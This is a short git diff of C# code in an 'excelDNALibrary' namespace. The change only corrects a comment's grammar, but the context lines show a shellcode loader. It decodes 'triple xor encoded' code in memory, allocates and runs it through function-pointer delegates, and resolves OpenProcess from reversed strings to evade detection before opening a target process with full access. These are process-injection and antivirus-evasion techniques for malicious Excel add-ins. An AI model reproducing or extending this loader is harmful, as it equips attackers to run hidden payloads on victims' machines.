@@ -112,7 +112,7 @@ namespace excelDNALibrary
                             0x89, 0xec,             //  mov esp, ebp
                             0x5d,                   //  pop ebp
                             0xc3                    //  ret
-                        };   //decodes code in memory that triple xor encoded 
+                        };   //decodes code in memory that is triple xor encoded 
             IntPtr shc_addr = Valloc(shc);
             IntPtr dec_addr = Valloc(dec);
             var water = Marshal.GetDelegateForFunctionPointer<AssemblyDecFunction>(dec_addr);
@@ -160,7 +160,7 @@ namespace excelDNALibrary
                            0x89, 0xec,              // mov esp, ebp
                            0x5d,                    // pop ebp
                            0xc3                     // ret
-                        };  //decodes code in memory that triple xor encoded 
+                        };  //decodes code in memory that is triple xor encoded 
             IntPtr pOP = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("ssecorPnepO"));
             OP fOP = (OP)Marshal.GetDelegateForFunctionPointer(pOP, typeof(OP));
             IntPtr hProcess = fOP(0x001F0FFF, false, pid); // PID of process should be used here 
